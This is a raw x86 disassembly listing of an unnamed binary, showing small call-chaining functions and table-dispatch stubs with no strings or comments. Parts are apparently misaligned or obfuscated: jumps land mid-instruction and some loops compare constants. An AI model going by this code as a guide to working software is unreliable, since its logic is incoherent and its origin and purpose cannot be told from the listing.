  4cd8d9:	add    BYTE PTR [eax],al
  4cd8db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd8e1:	sub    esp,0x44
  4cd8e4:	lea    eax,[ebx+0x78]
  4cd8e7:	and    esi,0xffff8e6e
  4cd8ed:	push   eax
  4cd8ee:	push   edx
  4cd8ef:	push   DWORD PTR [eax]
  4cd8f1:	call   0x4cd51c
  4cd8f6:	add    esp,0x8
  4cd8f9:	pop    eax
  4cd8fa:	push   eax
  4cd8fb:	call   0x4ce048
  4cd900:	pop    eax
  4cd901:	push   eax
  4cd902:	mov    edi,0x0
  4cd907:	push   edi
  4cd908:	call   0x4cd914
  4cd90d:	pop    eax
  4cd90e:	add    esp,0x44
  4cd911:	pop    ebp
  4cd912:	ret    
  4cd913:	add    BYTE PTR [edi+0x33],bl
  4cd916:	sar    bh,0x14
  4cd919:	inc    ebp
  4cd91a:	sbb    al,0xf7
  4cd91c:	dec    esp
  4cd91d:	add    BYTE PTR [edi+0x3e],dl
  4cd920:	ret    0x0
  4cd923:	push   es
  4cd924:	mov    edi,edi
  4cd926:	push   ebp
  4cd927:	mov    ebp,esp
  4cd929:	sub    esp,0x30
  4cd92c:	lea    ecx,ds:0x4d01b8
  4cd932:	sub    DWORD PTR [ebp-0x10],edx
  4cd935:	push   ecx
  4cd936:	push   DWORD PTR [ecx+0x30]
  4cd939:	push   DWORD PTR [ecx+0x9c]
  4cd93f:	call   0x4ce114
  4cd944:	add    esp,0x8
  4cd947:	pop    ecx
  4cd948:	push   ecx
  4cd949:	mov    ecx,0x0
  4cd94e:	push   ecx
  4cd94f:	call   0x4cdb00
  4cd954:	pop    ecx
  4cd955:	push   ecx
  4cd956:	call   0x4cd328
  4cd95b:	pop    ecx
  4cd95c:	add    esp,0x30
  4cd95f:	pop    ebp
  4cd960:	ret    
  4cd961:	add    BYTE PTR [eax],al
  4cd963:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd969:	sub    esp,0x40
  4cd96c:	mov    eax,0x4d006c
  4cd971:	cmp    eax,0x3a6b
  4cd976:	jbe    0x4cd967
  4cd978:	push   eax
  4cd979:	mov    edx,0x0
  4cd97e:	push   edx
  4cd97f:	call   0x4cdee4
  4cd984:	pop    eax
  4cd985:	push   eax
  4cd986:	push   DWORD PTR [eax+0x120]
  4cd98c:	push   DWORD PTR [eax+0x1f0]
  4cd992:	push   DWORD PTR [eax+0x1b0]
  4cd998:	call   0x4cd708
  4cd99d:	add    esp,0xc
  4cd9a0:	pop    eax
  4cd9a1:	push   eax
  4cd9a2:	push   0xfffffff4
  4cd9a4:	call   0x4cd9b0
  4cd9a9:	pop    eax
  4cd9aa:	add    esp,0x40
  4cd9ad:	pop    ebp
  4cd9ae:	ret    
  4cd9af:	add    BYTE PTR [edi+0x33],bl
  4cd9b2:	sar    bh,0x14
  4cd9b5:	inc    ebp
  4cd9b6:	sub    al,0xf7
  4cd9b8:	dec    esp
  4cd9b9:	add    BYTE PTR [edi+0x3e],dl
  4cd9bc:	ret    0x0
  4cd9bf:	push   es
  4cd9c0:	pop    edi
  4cd9c1:	xor    eax,eax
  4cd9c3:	call   DWORD PTR [eax*2+0x4cf73c]
  4cd9ca:	push   edi
  4cd9cb:	ds ret 0x0
  4cd9cf:	push   es
  4cd9d0:	pop    edi
  4cd9d1:	xor    eax,eax
  4cd9d3:	call   DWORD PTR [eax*2+0x4cf750]
  4cd9da:	push   edi
  4cd9db:	ds ret 0x0
  4cd9df:	push   es
  4cd9e0:	mov    edi,edi
  4cd9e2:	push   ebp
  4cd9e3:	mov    ebp,esp
  4cd9e5:	sub    esp,0x44
  4cd9e8:	lea    eax,ds:0x4d012c
  4cd9ee:	adc    DWORD PTR [eax-0x4c],ebx
  4cd9f1:	push   eax
  4cd9f2:	push   ebx
  4cd9f3:	push   edi
  4cd9f4:	push   edx
  4cd9f5:	call   0x4cdbc0
  4cd9fa:	add    esp,0xc
  4cd9fd:	pop    eax
  4cd9fe:	push   eax
  4cd9ff:	mov    ebx,0x0
  4cda04:	push   ebx
  4cda05:	call   0x4cdb00
  4cda0a:	pop    eax
  4cda0b:	push   eax
  4cda0c:	mov    ebx,0x0
  4cda11:	push   ebx
  4cda12:	call   0x4cdb00
  4cda17:	pop    eax
  4cda18:	add    esp,0x44
  4cda1b:	pop    ebp
  4cda1c:	ret    
  4cda1d:	add    BYTE PTR [eax],al
  4cda1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cda25:	sub    esp,0x44
  4cda28:	lea    esi,ds:0x4d01c8
  4cda2e:	or     edi,eax
  4cda30:	push   0x0
  4cda32:	call   0x4cddf4
  4cda37:	push   esi
  4cda38:	push   ecx
  4cda39:	push   DWORD PTR [esi+0x14]
  4cda3c:	call   0x4cdc58
  4cda41:	add    esp,0x8
  4cda44:	pop    esi
  4cda45:	push   0x0
  4cda47:	call   0x4cd6b8
  4cda4c:	add    esp,0x44
  4cda4f:	pop    ebp
  4cda50:	ret    
  4cda51:	add    BYTE PTR [eax],al
  4cda53:	add    BYTE PTR [edi+0x33],bl
  4cda56:	sar    bh,0x14
  4cda59:	inc    ebp
  4cda5a:	sbb    bh,dh
  4cda5c:	dec    esp
  4cda5d:	add    BYTE PTR [edi+0x3e],dl
  4cda60:	ret    0x0
  4cda63:	push   es
  4cda64:	mov    edi,edi
  4cda66:	push   ebp
  4cda67:	mov    ebp,esp
  4cda69:	sub    esp,0x30
  4cda6c:	mov    esi,0x4d0038
  4cda71:	adc    edx,0x32
  4cda74:	call   0x4cdb50
  4cda79:	push   esi
  4cda7a:	push   ecx
  4cda7b:	push   DWORD PTR [esi+0xf0]
  4cda81:	call   0x4cde14
  4cda86:	add    esp,0x8
  4cda89:	pop    esi
  4cda8a:	push   0x0
  4cda8c:	call   0x4cddf4
  4cda91:	add    esp,0x30
  4cda94:	pop    ebp
  4cda95:	ret    
  4cda96:	add    BYTE PTR [eax],al
  4cda98:	pop    edi
  4cda99:	xor    eax,eax
  4cda9b:	call   DWORD PTR [eax*2+0x4cf770]
  4cdaa2:	push   edi
  4cdaa3:	ds ret 0x0
  4cdaa7:	push   es
  4cdaa8:	pop    edi
  4cdaa9:	xor    eax,eax
  4cdaab:	call   DWORD PTR [eax*2+0x4cf75c]
  4cdab2:	push   edi
  4cdab3:	ds ret 0x0
  4cdab7:	push   es
  4cdab8:	mov    edi,edi
  4cdaba:	push   ebp
  4cdabb:	mov    ebp,esp
  4cdabd:	sub    esp,0x24
  4cdac0:	lea    ecx,ds:0x4d01d0
  4cdac6:	mov    DWORD PTR [ebp-0x18],0x70
  4cdacd:	push   ecx
  4cdace:	push   DWORD PTR [ecx+0x16c]
  4cdad4:	push   DWORD PTR [ecx+0x1a0]
  4cdada:	push   edx
  4cdadb:	push   edx
  4cdadc:	call   0x4cd198
  4cdae1:	add    esp,0x10
  4cdae4:	pop    ecx
  4cdae5:	push   ecx
  4cdae6:	mov    esi,0xfffffff4
  4cdaeb:	push   esi
  4cdaec:	call   0x4cd9b0
  4cdaf1:	pop    ecx
  4cdaf2:	push   ecx
  4cdaf3:	push   0x0
  4cdaf5:	call   0x4cde60
  4cdafa:	pop    ecx
  4cdafb:	add    esp,0x24
  4cdafe:	pop    ebp
  4cdaff:	ret    
  4cdb00:	pop    edi
  4cdb01:	xor    eax,eax
  4cdb03:	call   DWORD PTR [eax*2+0x4cf760]
  4cdb0a:	push   edi
  4cdb0b:	ds ret 0x0
  4cdb0f:	push   es
  4cdb10:	mov    edi,edi
  4cdb12:	push   ebp
  4cdb13:	mov    ebp,esp
  4cdb15:	sub    esp,0x40
  4cdb18:	mov    esi,0x4d0000
  4cdb1d:	and    ebx,esi
  4cdb1f:	push   0xfffffff4
  4cdb21:	call   0x4cd9b0
  4cdb26:	push   esi
  4cdb27:	push   eax
  4cdb28:	push   DWORD PTR [esi+0x1dc]
  4cdb2e:	push   DWORD PTR [esi+0x144]
  4cdb34:	call   0x4ce148
  4cdb39:	add    esp,0xc
  4cdb3c:	pop    esi
  4cdb3d:	lea    eax,[esi]
  4cdb3f:	push   eax
  4cdb40:	call   0x4cd56c
  4cdb45:	test   eax,eax
  4cdb47:	jne    0x4cdb3e
  4cdb49:	add    esp,0x40
  4cdb4c:	pop    ebp
  4cdb4d:	ret    
  4cdb4e:	add    BYTE PTR [eax],al
  4cdb50:	pop    edi
  4cdb51:	xor    eax,eax
  4cdb53:	call   DWORD PTR [eax*2+0x4cf6f8]
  4cdb5a:	push   edi
  4cdb5b:	ds ret 0x0
  4cdb5f:	push   es
  4cdb60:	pop    edi
  4cdb61:	xor    eax,eax
  4cdb63:	call   DWORD PTR [eax*2+0x4cf788]
  4cdb6a:	push   edi
  4cdb6b:	ds ret 0x0
  4cdb6f:	push   es
  4cdb70:	mov    edi,edi
  4cdb72:	push   ebp
  4cdb73:	mov    ebp,esp
  4cdb75:	sub    esp,0x50
  4cdb78:	lea    eax,[edx+0xf0]
  4cdb7e:	mov    DWORD PTR [eax+0xac],esi
  4cdb84:	push   eax
  4cdb85:	push   0x0
  4cdb87:	call   0x4ce1e0
  4cdb8c:	pop    eax
  4cdb8d:	push   eax
  4cdb8e:	push   ebx
  4cdb8f:	push   DWORD PTR [eax+0x1c]
  4cdb92:	push   ecx
  4cdb93:	push   ebx
  4cdb94:	call   0x4cdf2c
  4cdb99:	add    esp,0x10
  4cdb9c:	pop    eax
  4cdb9d:	push   eax
  4cdb9e:	mov    ebx,0x0
  4cdba3:	push   ebx
  4cdba4:	call   0x4cde60
  4cdba9:	pop    eax
  4cdbaa:	add    esp,0x50
  4cdbad:	pop    ebp
  4cdbae:	ret    
  4cdbaf:	add    BYTE PTR [edi+0x33],bl
  4cdbb2:	sar    bh,0x14
  4cdbb5:	inc    ebp
  4cdbb6:	test   DWORD PTR fs:[eax+eax*1+0x57],0xc23e
  4cdbbf:	push   es
  4cdbc0:	mov    edi,edi
  4cdbc2:	push   ebp
  4cdbc3:	mov    ebp,esp
  4cdbc5:	sub    esp,0x40
  4cdbc8:	lea    esi,[eax-0x54]
  4cdbcb:	add    DWORD PTR [esi+0xec],edi
  4cdbd1:	push   esi
  4cdbd2:	push   DWORD PTR [esi+0xb8]
  4cdbd8:	push   edi
  4cdbd9:	push   ebx
  4cdbda:	call   0x4cd338
  4cdbdf:	add    esp,0xc
  4cdbe2:	pop    esi
  4cdbe3:	mov    ecx,0x0
  4cdbe8:	push   ecx
  4cdbe9:	call   0x4cd914
  4cdbee:	mov    edi,0x0
  4cdbf3:	push   edi
  4cdbf4:	call   0x4cdb00
  4cdbf9:	add    esp,0x40
  4cdbfc:	pop    ebp
  4cdbfd:	ret    
  4cdbfe:	add    BYTE PTR [eax],al
  4cdc00:	mov    edi,edi
  4cdc02:	push   ebp
  4cdc03:	mov    ebp,esp
  4cdc05:	sub    esp,0x24
  4cdc08:	mov    ebx,0x4d0070
  4cdc0d:	cmp    ebx,0xbed
  4cdc13:	jb     0x4cdc03
  4cdc15:	push   0xfffffff4
  4cdc17:	call   0x4cd9b0
  4cdc1c:	push   ebx
  4cdc1d:	push   ecx
  4cdc1e:	push   DWORD PTR [ebx+0x34]
  4cdc21:	push   DWORD PTR [ebx+0x4c]
  4cdc24:	call   0x4cd7d8
  4cdc29:	add    esp,0xc
  4cdc2c:	pop    ebx
  4cdc2d:	call   0x4cda54
  4cdc32:	add    esp,0x24
  4cdc35:	pop    ebp
  4cdc36:	ret    
  4cdc37:	add    BYTE PTR [edi+0x33],bl
  4cdc3a:	sar    bh,0x14
  4cdc3d:	inc    ebp
  4cdc3e:	xor    al,0xf7
  4cdc40:	dec    esp
  4cdc41:	add    BYTE PTR [edi+0x3e],dl
  4cdc44:	ret    0x0
  4cdc47:	push   es
  4cdc48:	pop    edi
  4cdc49:	xor    eax,eax
  4cdc4b:	call   DWORD PTR [eax*2+0x4cf710]
  4cdc52:	push   edi
  4cdc53:	ds ret 0x0
  4cdc57:	push   es
  4cdc58:	mov    edi,edi
  4cdc5a:	push   ebp
  4cdc5b:	mov    ebp,esp
  4cdc5d:	sub    esp,0x40
  4cdc60:	lea    edi,[esi-0x1ac]
  4cdc66:	and    DWORD PTR [ebp-0x3c],edx
  4cdc69:	push   edi
  4cdc6a:	push   eax
  4cdc6b:	push   ecx
  4cdc6c:	push   esi
  4cdc6d:	push   DWORD PTR [edi+0x118]
  4cdc73:	call   0x4cdd58
  4cdc78:	add    esp,0x10
  4cdc7b:	pop    edi
  4cdc7c:	push   edi
  4cdc7d:	push   0xfffffff4
  4cdc7f:	call   0x4cd9b0
  4cdc84:	pop    edi
  4cdc85:	push   edi
  4cdc86:	mov    esi,0x0
  4cdc8b:	push   esi
  4cdc8c:	call   0x4cd424
  4cdc91:	pop    edi
  4cdc92:	add    esp,0x40
  4cdc95:	pop    ebp
  4cdc96:	ret    
  4cdc97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdc9d:	sub    esp,0x1c
  4cdca0:	mov    edi,0x4d0044
  4cdca5:	or     ebx,0x55
  4cdca8:	push   edi
  4cdca9:	push   DWORD PTR [edi+0xc4]
  4cdcaf:	push   edx
  4cdcb0:	push   esi
  4cdcb1:	call   0x4cdfb8
  4cdcb6:	add    esp,0xc
  4cdcb9:	pop    edi
  4cdcba:	push   edi
  4cdcbb:	call   0x4cdb50
  4cdcc0:	pop    edi
  4cdcc1:	push   edi
  4cdcc2:	lea    edx,[edi-0x44]
  4cdcc5:	push   edx
  4cdcc6:	call   0x4cd56c
  4cdccb:	test   eax,eax
  4cdccd:	jne    0x4cdcc2
  4cdccf:	pop    edi
  4cdcd0:	add    esp,0x1c
  4cdcd3:	pop    ebp
  4cdcd4:	ret    
  4cdcd5:	add    BYTE PTR [eax],al
  4cdcd7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdcdd:	sub    esp,0x60
  4cdce0:	lea    edi,[edx]
  4cdce2:	add    DWORD PTR [edi+0x88],0xffff8869
  4cdcec:	push   edi
  4cdced:	push   DWORD PTR [edi+0xdc]
  4cdcf3:	push   DWORD PTR [edi+0x158]
  4cdcf9:	push   eax
  4cdcfa:	call   0x4cd3f0
  4cdcff:	add    esp,0xc
  4cdd02:	pop    edi
  4cdd03:	push   edi
  4cdd04:	call   0x4ce048
  4cdd09:	pop    edi
  4cdd0a:	push   edi
  4cdd0b:	push   0xfffffff4
  4cdd0d:	call   0x4cd9b0
  4cdd12:	pop    edi
  4cdd13:	add    esp,0x60
  4cdd16:	pop    ebp
  4cdd17:	ret    
  4cdd18:	mov    edi,edi
  4cdd1a:	push   ebp
  4cdd1b:	mov    ebp,esp
  4cdd1d:	sub    esp,0x24
  4cdd20:	mov    ecx,0x4d0024
  4cdd25:	add    eax,0x73
  4cdd28:	push   ecx
  4cdd29:	push   ebx
  4cdd2a:	push   DWORD PTR [ecx+0x130]
  4cdd30:	call   0x4ce19c
  4cdd35:	add    esp,0x8
  4cdd38:	pop    ecx
  4cdd39:	push   ecx
  4cdd3a:	mov    eax,0x0
  4cdd3f:	push   eax
  4cdd40:	call   0x4cdb00
  4cdd45:	pop    ecx
  4cdd46:	push   ecx
  4cdd47:	mov    esi,0x0
  4cdd4c:	push   esi
  4cdd4d:	call   0x4cd6b8
  4cdd52:	pop    ecx
  4cdd53:	add    esp,0x24
  4cdd56:	pop    ebp
  4cdd57:	ret    
  4cdd58:	mov    edi,edi
  4cdd5a:	push   ebp
  4cdd5b:	mov    ebp,esp
  4cdd5d:	sub    esp,0x1c
  4cdd60:	mov    ecx,0x4d0174
  4cdd65:	and    esi,DWORD PTR [ebp-0x4]
  4cdd68:	push   ecx
  4cdd69:	push   DWORD PTR [ecx+0xcc]
  4cdd6f:	push   edi
  4cdd70:	call   0x4cd030
  4cdd75:	add    esp,0x8
  4cdd78:	pop    ecx
  4cdd79:	push   ecx
  4cdd7a:	call   0x4ce048
  4cdd7f:	pop    ecx
  4cdd80:	push   ecx
  4cdd81:	push   0x0
  4cdd83:	call   0x4cdb00
  4cdd88:	pop    ecx
  4cdd89:	add    esp,0x1c
  4cdd8c:	pop    ebp
  4cdd8d:	ret    
  4cdd8e:	add    BYTE PTR [eax],al
  4cdd90:	mov    edi,edi
  4cdd92:	push   ebp
  4cdd93:	mov    ebp,esp
  4cdd95:	sub    esp,0x30
  4cdd98:	lea    edx,[eax+0x24]
  4cdd9b:	adc    DWORD PTR [edx-0x14],edx
  4cdd9e:	push   edx
  4cdd9f:	push   DWORD PTR [edx+0xd4]
  4cdda5:	push   DWORD PTR [edx+0x1f0]
  4cddab:	push   esi
  4cddac:	push   DWORD PTR [edx+0x118]
  4cddb2:	call   0x4cdc00
  4cddb7:	add    esp,0x10
  4cddba:	pop    edx
  4cddbb:	push   edx
  4cddbc:	mov    edx,0x0
  4cddc1:	push   edx
  4cddc2:	call   0x4cdee4
  4cddc7:	pop    edx
  4cddc8:	push   edx
  4cddc9:	call   0x4cd328
  4cddce:	pop    edx
  4cddcf:	add    esp,0x30
  4cddd2:	pop    ebp
  4cddd3:	ret    
  4cddd4:	pop    edi
  4cddd5:	xor    eax,eax
  4cddd7:	call   DWORD PTR [eax*2+0x4cf778]
  4cddde:	push   edi
  4cdddf:	ds ret 0x0
  4cdde3:	push   es
  4cdde4:	pop    edi
  4cdde5:	xor    eax,eax
  4cdde7:	call   DWORD PTR [eax*2+0x4cf720]
  4cddee:	push   edi
  4cddef:	ds ret 0x0
  4cddf3:	push   es
  4cddf4:	pop    edi
  4cddf5:	xor    eax,eax
  4cddf7:	call   DWORD PTR [eax*2+0x4cf724]
  4cddfe:	push   edi
  4cddff:	ds ret 0x0
  4cde03:	push   es
  4cde04:	pop    edi
  4cde05:	xor    eax,eax
  4cde07:	call   DWORD PTR [eax*2+0x4cf74c]
  4cde0e:	push   edi
  4cde0f:	ds ret 0x0
  4cde13:	push   es
  4cde14:	mov    edi,edi
  4cde16:	push   ebp
  4cde17:	mov    ebp,esp
  4cde19:	sub    esp,0x50
  4cde1c:	lea    ebx,[esi+0xe8]
  4cde22:	and    esi,0xffff97ba
  4cde28:	push   ebx
  4cde29:	push   edx
  4cde2a:	push   esi
  4cde2b:	push   DWORD PTR [ebx+0x170]
  4cde31:	push   esi
  4cde32:	call   0x4cd2e4
  4cde37:	add    esp,0x10
  4cde3a:	pop    ebx
  4cde3b:	call   0x4ce048
  4cde40:	mov    esi,0x0
  4cde45:	push   esi
  4cde46:	call   0x4cde50
  4cde4b:	add    esp,0x50
  4cde4e:	pop    ebp
  4cde4f:	ret    
  4cde50:	pop    edi
  4cde51:	xor    eax,eax
  4cde53:	call   DWORD PTR [eax*2+0x4cf76c]
  4cde5a:	push   edi
  4cde5b:	ds ret 0x0
  4cde5f:	push   es
  4cde60:	pop    edi
  4cde61:	xor    eax,eax
  4cde63:	call   DWORD PTR [eax*2+0x4cf6f4]
  4cde6a:	push   edi
  4cde6b:	ds ret 0x0
  4cde6f:	push   es
  4cde70:	pop    edi
  4cde71:	xor    eax,eax
  4cde73:	call   DWORD PTR [eax*2+0x4cf784]
  4cde7a:	push   edi
  4cde7b:	ds ret 0x0
  4cde7f:	push   es
  4cde80:	pop    edi
  4cde81:	xor    eax,eax
  4cde83:	call   DWORD PTR [eax*2+0x4cf6e8]
  4cde8a:	push   edi
  4cde8b:	ds ret 0x0
  4cde8f:	push   es
  4cde90:	pop    edi
  4cde91:	xor    eax,eax
  4cde93:	call   DWORD PTR [eax*2+0x4cf780]
  4cde9a:	push   edi
  4cde9b:	ds ret 0x0
  4cde9f:	push   es
  4cdea0:	mov    edi,edi
  4cdea2:	push   ebp
  4cdea3:	mov    ebp,esp
  4cdea5:	sub    esp,0x28
  4cdea8:	lea    ecx,[eax+0x7c]
  4cdeab:	sub    DWORD PTR [ebp-0x18],esi
  4cdeae:	push   ecx
  4cdeaf:	push   ebx
  4cdeb0:	push   edi
  4cdeb1:	call   0x4cd4cc
  4cdeb6:	add    esp,0x8
  4cdeb9:	pop    ecx
  4cdeba:	push   ecx
  4cdebb:	push   0x0
  4cdebd:	call   0x4cde60
  4cdec2:	pop    ecx
  4cdec3:	push   ecx
  4cdec4:	push   0x0
  4cdec6:	call   0x4cd424
  4cdecb:	pop    ecx
  4cdecc:	add    esp,0x28
  4cdecf:	pop    ebp
  4cded0:	ret    
  4cded1:	add    BYTE PTR [eax],al
  4cded3:	add    BYTE PTR [edi+0x33],bl
  4cded6:	sar    bh,0x14
  4cded9:	inc    ebp
  4cdeda:	jl     0x4cded3
  4cdedc:	dec    esp
  4cdedd:	add    BYTE PTR [edi+0x3e],dl
  4cdee0:	ret    0x0
  4cdee3:	push   es
  4cdee4:	pop    edi
  4cdee5:	xor    eax,eax
  4cdee7:	call   DWORD PTR [eax*2+0x4cf6f0]
  4cdeee:	push   edi
  4cdeef:	ds ret 0x0
  4cdef3:	push   es
  4cdef4:	mov    edi,edi
  4cdef6:	push   ebp
  4cdef7:	mov    ebp,esp
  4cdef9:	sub    esp,0x34
  4cdefc:	lea    edi,[edx+0x38]
  4cdeff:	add    edx,esi
  4cdf01:	push   edi
  4cdf02:	push   0x0
  4cdf04:	call   0x4cde60
  4cdf09:	pop    edi
  4cdf0a:	push   edi
  4cdf0b:	push   DWORD PTR [edi+0x68]
  4cdf0e:	push   DWORD PTR [edi+0x1bc]
  4cdf14:	push   edx
  4cdf15:	push   esi
  4cdf16:	call   0x4cdd18
  4cdf1b:	add    esp,0x10
  4cdf1e:	pop    edi
  4cdf1f:	push   edi
  4cdf20:	call   0x4cd328
  4cdf25:	pop    edi
  4cdf26:	add    esp,0x34
  4cdf29:	pop    ebp
  4cdf2a:	ret    
  4cdf2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdf31:	sub    esp,0x60
  4cdf34:	lea    edi,ds:0x4d0044
  4cdf3a:	adc    DWORD PTR [edi-0x30],0x59
  4cdf3e:	push   edi
  4cdf3f:	push   0x0
  4cdf41:	call   0x4cddf4
  4cdf46:	pop    edi
  4cdf47:	push   edi
  4cdf48:	push   DWORD PTR [edi+0x40]
  4cdf4b:	push   DWORD PTR [edi+0xb4]
  4cdf51:	call   0x4cda64
  4cdf56:	add    esp,0x8
  4cdf59:	pop    edi
  4cdf5a:	push   edi
  4cdf5b:	push   0x0
  4cdf5d:	call   0x4cd914
  4cdf62:	pop    edi
  4cdf63:	add    esp,0x60
  4cdf66:	pop    ebp
  4cdf67:	ret    
  4cdf68:	pop    edi
  4cdf69:	xor    eax,eax
  4cdf6b:	call   DWORD PTR [eax*2+0x4cf768]
  4cdf72:	push   edi
  4cdf73:	ds ret 0x0
  4cdf77:	push   es
  4cdf78:	mov    edi,edi
  4cdf7a:	push   ebp
  4cdf7b:	mov    ebp,esp
  4cdf7d:	sub    esp,0x54
  4cdf80:	lea    esi,ds:0x4d018c
  4cdf86:	mov    DWORD PTR [ebp-0x3c],0x5079
  4cdf8d:	push   esi
  4cdf8e:	push   eax
  4cdf8f:	push   edx
  4cdf90:	push   ecx
  4cdf91:	call   0x4cd8a0
  4cdf96:	add    esp,0xc
  4cdf99:	pop    esi
  4cdf9a:	mov    ecx,0x0
  4cdf9f:	push   ecx
  4cdfa0:	call   0x4cddf4
  4cdfa5:	mov    ecx,0x0
  4cdfaa:	push   ecx
  4cdfab:	call   0x4cd914
  4cdfb0:	add    esp,0x54
  4cdfb3:	pop    ebp
  4cdfb4:	ret    
  4cdfb5:	add    BYTE PTR [eax],al
  4cdfb7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cdfbd:	sub    esp,0x28
  4cdfc0:	lea    edx,[edi+0xf8]
  4cdfc6:	and    eax,0xffffe1fa
  4cdfcb:	push   edx
  4cdfcc:	mov    edi,0x0
  4cdfd1:	push   edi
  4cdfd2:	call   0x4cddf4
  4cdfd7:	pop    edx
  4cdfd8:	push   edx
  4cdfd9:	push   DWORD PTR [edx+0xbc]
  4cdfdf:	push   esi
  4cdfe0:	push   ecx
  4cdfe1:	push   DWORD PTR [edx+0x44]
  4cdfe4:	call   0x4cdf78
  4cdfe9:	add    esp,0x10
  4cdfec:	pop    edx
  4cdfed:	push   edx
  4cdfee:	mov    esi,0x0
  4cdff3:	push   esi
  4cdff4:	call   0x4cdb00
  4cdff9:	pop    edx
  4cdffa:	add    esp,0x28
  4cdffd:	pop    ebp
  4cdffe:	ret    
  4cdfff:	add    BYTE PTR [edi+0x33],bl
  4ce002:	sar    bh,0x14
  4ce005:	inc    ebp
  4ce006:	dec    eax
  4ce007:	test   DWORD PTR [eax+eax*1+0x57],0xc23e
  4ce00f:	push   es
  4ce010:	mov    edi,edi
  4ce012:	push   ebp
  4ce013:	mov    ebp,esp
  4ce015:	sub    esp,0x24
  4ce018:	mov    edi,0x4d0128
  4ce01d:	mov    DWORD PTR [ebp-0x10],0x34
  4ce024:	push   edi
  4ce025:	call   0x4cda54
  4ce02a:	pop    edi
  4ce02b:	push   edi
  4ce02c:	push   edx
  4ce02d:	push   ecx
  4ce02e:	call   0x4cd818
  4ce033:	add    esp,0x8
  4ce036:	pop    edi
  4ce037:	push   edi
  4ce038:	push   0x0
  4ce03a:	call   0x4cd6b8
  4ce03f:	pop    edi
  4ce040:	add    esp,0x24
  4ce043:	pop    ebp
  4ce044:	ret    
  4ce045:	add    BYTE PTR [eax],al
  4ce047:	add    BYTE PTR [edi+0x33],bl
  4ce04a:	sar    bh,0x14
  4ce04d:	inc    ebp
  4ce04e:	or     bh,dh
  4ce050:	dec    esp
  4ce051:	add    BYTE PTR [edi+0x3e],dl
  4ce054:	ret    0x0
  4ce057:	push   es
  4ce058:	mov    edi,edi
  4ce05a:	push   ebp
  4ce05b:	mov    ebp,esp
  4ce05d:	sub    esp,0x54
  4ce060:	lea    esi,[ebx-0x150]
  4ce066:	xor    DWORD PTR [esi+0x1a8],esi
  4ce06c:	push   esi
  4ce06d:	push   DWORD PTR [esi+0xcc]
  4ce073:	push   DWORD PTR [esi+0x144]
  4ce079:	call   0x4cd47c
  4ce07e:	add    esp,0x8
  4ce081:	pop    esi
  4ce082:	push   0x0
  4ce084:	call   0x4cd6b8
  4ce089:	call   0x4cda54
  4ce08e:	add    esp,0x54
  4ce091:	pop    ebp
  4ce092:	ret    
  4ce093:	add    BYTE PTR [ebx-0x1374aa01],cl
  4ce099:	sub    esp,0x34
  4ce09c:	mov    eax,0x4d01a0
  4ce0a1:	xor    edi,0xffff8ebc
  4ce0a7:	push   eax
  4ce0a8:	push   DWORD PTR [eax+0x1b4]
  4ce0ae:	push   ecx
  4ce0af:	push   ecx
  4ce0b0:	call   0x4cd218
  4ce0b5:	add    esp,0xc
  4ce0b8:	pop    eax
  4ce0b9:	push   eax
  4ce0ba:	mov    ecx,0x0
  4ce0bf:	push   ecx
  4ce0c0:	call   0x4cde60
  4ce0c5:	pop    eax
  4ce0c6:	push   eax
  4ce0c7:	mov    edi,0x0
  4ce0cc:	push   edi
  4ce0cd:	call   0x4cddf4
  4ce0d2:	pop    eax
  4ce0d3:	add    esp,0x34
  4ce0d6:	pop    ebp
  4ce0d7:	ret    
  4ce0d8:	mov    edi,edi
  4ce0da:	push   ebp
  4ce0db:	mov    ebp,esp
  4ce0dd:	sub    esp,0x60
  4ce0e0:	mov    ebx,0x4d0090
  4ce0e5:	and    DWORD PTR [ebp-0x18],0xffffffc3
  4ce0e9:	push   ebx
  4ce0ea:	push   eax
  4ce0eb:	push   edx
  4ce0ec:	push   esi
  4ce0ed:	push   edi
  4ce0ee:	call   0x4cd8dc
  4ce0f3:	add    esp,0x10
  4ce0f6:	pop    ebx
  4ce0f7:	mov    ecx,0x0
  4ce0fc:	push   ecx
  4ce0fd:	call   0x4cddf4
  4ce102:	mov    edx,0x0
  4ce107:	push   edx
  4ce108:	call   0x4cddf4
  4ce10d:	add    esp,0x60
  4ce110:	pop    ebp
  4ce111:	ret    
  4ce112:	add    BYTE PTR [eax],al
  4ce114:	mov    edi,edi
  4ce116:	push   ebp
  4ce117:	mov    ebp,esp
  4ce119:	sub    esp,0x34
  4ce11c:	lea    ebx,[ecx-0x6c]
  4ce11f:	add    DWORD PTR [ebp-0x34],ebx
  4ce122:	push   0x0
  4ce124:	call   0x4cddf4
  4ce129:	push   ebx
  4ce12a:	push   ecx
  4ce12b:	push   DWORD PTR [ebx+0x1e4]
  4ce131:	push   edx
  4ce132:	call   0x4ce094
  4ce137:	add    esp,0xc
  4ce13a:	pop    ebx
  4ce13b:	call   0x4ce048
  4ce140:	add    esp,0x34
  4ce143:	pop    ebp
  4ce144:	ret    
  4ce145:	add    BYTE PTR [eax],al
  4ce147:	add    BYTE PTR [ebx-0x1374aa01],cl
  4ce14d:	sub    esp,0x60
  4ce150:	lea    ecx,ds:0x4d0084
  4ce156:	mov    DWORD PTR [ecx+0x11c],0x5e
  4ce160:	push   ecx
  4ce161:	call   0x4ce048
  4ce166:	pop    ecx
  4ce167:	push   ecx
  4ce168:	push   edx
  4ce169:	push   esi
  4ce16a:	call   0x4ce0d8
  4ce16f:	add    esp,0x8
  4ce172:	pop    ecx
  4ce173:	push   ecx
  4ce174:	lea    esi,[ecx-0x84]
  4ce17a:	push   esi
  4ce17b:	call   0x4cd56c
  4ce180:	test   eax,eax
  4ce182:	jne    0x4ce174
  4ce184:	pop    ecx
  4ce185:	add    esp,0x60
  4ce188:	pop    ebp
  4ce189:	ret    
  4ce18a:	add    BYTE PTR [eax],al
  4ce18c:	pop    edi
  4ce18d:	xor    eax,eax
  4ce18f:	call   DWORD PTR [eax*2+0x4cf728]
  4ce196:	push   edi
  4ce197:	ds ret 0x0
  4ce19b:	push   es
  4ce19c:	mov    edi,edi
  4ce19e:	push   ebp
  4ce19f:	mov    ebp,esp
  4ce1a1:	sub    esp,0x54
  4ce1a4:	lea    edx,ds:0x4d00e8
